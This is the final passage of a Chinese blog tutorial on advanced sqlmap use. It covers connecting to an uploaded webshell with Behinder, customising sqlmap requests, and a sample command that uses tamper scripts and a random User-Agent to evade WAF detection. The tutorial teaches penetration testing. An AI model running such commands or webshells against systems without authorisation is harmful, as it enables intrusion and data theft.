+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232153105.png" data-caption="image-20221029232153105"><img src="/../images/sqlmap/image-20221029232153105.png" alt="image-20221029232153105"></a></p>
+<p>上传后</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232659447.png" data-caption="image-20221029232659447"><img src="/../images/sqlmap/image-20221029232659447.png" alt="image-20221029232659447"></a></p>
+<p>连接 Webshell，这里使用冰蝎4 虽然上传成功但连接不成功，以下换回冰蝎3才能成功连接</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232331747.png" data-caption="image-20221029232331747"><img src="/../images/sqlmap/image-20221029232331747.png" alt="image-20221029232331747"></a></p>
+<h3 id="定制化参数"><a href="#定制化参数" class="headerlink" title="定制化参数"></a>定制化参数</h3><p>有时候通过测试发现存在 sql 注入，但利用 sqlmap 进行验证时发现却不能检测出来存在注入，这时候就需要根据实际情况对 sqlmap 请求参数进行处理</p>
+<p>抓取数据包，将 Request 请求复制保存为 .txt 文件，放置到 sqlmap 目录下。</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029221914451.png" data-caption="image-20221029221914451"><img src="/../images/sqlmap/image-20221029221914451.png" alt="image-20221029221914451"></a></p>
+<p>直接对数据包进行验证，sqlmap 没有发现漏洞</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222203157.png" data-caption="image-20221029222203157"><img src="/../images/sqlmap/image-20221029222203157.png" alt="image-20221029222203157"></a></p>
+<p>我们将探测等级提升至 –level 3 ，再次进行测试，sqlmap 可发现漏洞的存在</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222231713.png" data-caption="image-20221029222231713"><img src="/../images/sqlmap/image-20221029222231713.png" alt="image-20221029222231713"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222252599.png" data-caption="image-20221029222252599"><img src="/../images/sqlmap/image-20221029222252599.png" alt="image-20221029222252599"></a></p>
+<p>这只是一个小例子，我们实战中可能对存在 WAF 或其限制，我们可以通过一步步调试 sqlmap 参数进行测试，比如我们为了逃避系统的检测我们可以使用 –random-agent 变换 User-Agent 头，–technique 指定注入类型， –tamper 指定脚本等等指令进行调试，除此之外，我们还可以通过 -v 参数查看 sqlmap 的测试 payload 机制，研究其 payload 的组成，搭配temper 能更好的分析其 bypass 机制。</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029223129493.png" data-caption="image-20221029223129493"><img src="/../images/sqlmap/image-20221029223129493.png" alt="image-20221029223129493"></a></p>
+<p>本人常用命令 <code>sqlmap.py -r data.txt --levle 3 -p username --dbs --tamper space2morecomment --random-agent --ignore-redirects --ignore-proxy --technique=B</code></p>
+<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>通过案例学习 sqlmap 的基本使用，最大程度自动化测试，工具只是辅助，对于 SQL 注入这里类型，还是得打好基础，理解其原理，本人也一直在持续学习中，把它研究透还是得需要点时间。当然 sqlmap 作为成熟的自动化工具，其功能不止以上所阐述的这么少，其余功能有待挖掘。</p>
+<h2 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.yang99.top/index.php/archives/30/</span><br><span class="line">https://www.anquanke.com/post/id/235846</span><br><span class="line">https://blog.yd0ng.com/2020/09/07/SQLMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E5%8F%8Atamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</span><br><span class="line">https://www.cnblogs.com/fzblog/p/13800604.html</span><br><span class="line">https://sqlmap.kvko.live/usage</span><br></pre></td></tr></table></figure></div>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">二、sqlmap常用参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">三、基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Temper%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">四、Temper脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E8%87%AA%E5%B8%A6%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">sqlmap自带脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Temper%E8%87%AA%E7%BC%96%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">Temper自编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">五、具体利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text">基础使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8"><span class="toc-number">5.2.</span> <span class="toc-text">进阶使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#os-shell"><span class="toc-number">5.2.1.</span> <span class="toc-text">os-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-shell"><span class="toc-number">5.2.2.</span> <span class="toc-text">sql-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-read"><span class="toc-number">5.2.3.</span> <span class="toc-text">file-read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-write%E3%80%81file-dest"><span class="toc-number">5.2.4.</span> <span class="toc-text">file-write、file-dest</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E5%88%B6%E5%8C%96%E5%8F%82%E6%95%B0"><span class="toc-number">5.3.</span> <span class="toc-text">定制化参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">六、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">七、参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&text=Sqlmap 进阶使用考究"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&is_video=false&description=Sqlmap 进阶使用考究"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sqlmap 进阶使用考究&body=Check out this article: http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&name=Sqlmap 进阶使用考究&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&t=Sqlmap 进阶使用考究"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
